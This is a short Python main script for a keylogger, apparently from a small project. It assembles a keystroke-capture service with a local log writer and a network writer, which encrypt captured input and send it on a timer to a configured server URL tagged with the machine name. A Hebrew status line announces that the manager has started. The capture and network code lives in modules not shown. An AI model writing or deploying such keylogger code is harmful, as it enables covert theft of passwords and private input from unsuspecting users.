from services.KeyLoggerService import KeyLoggerService
from services.file_writer import FileWriter
from services.networkwriter import NetworkWriter
from encryption.encryptor import Encryptor
from managers.keyLoggerManager import KeyLoggerManager
from config import Config
import time
import socket

def main():
    encryptor = Encryptor(key=Config.ENCRYPTION_KEY)
    file_writer = FileWriter(Config.LOG_DIRECTORY)
    network_writer = NetworkWriter(Config.SERVER_URL, encryptor)
    keylogger = KeyLoggerService()
    manager = KeyLoggerManager(keylogger=keylogger,
                                writers=[file_writer, network_writer],
                                encryptor = encryptor,
                                interval = Config.UPDATE_INTERVAL,
                                machine_name = Config.MACHINE_NAME)
    
    print("🚀 KeyLogger Manager התחיל לרוץ...")
    manager.run()

if __name__ == "__main__":
    main() 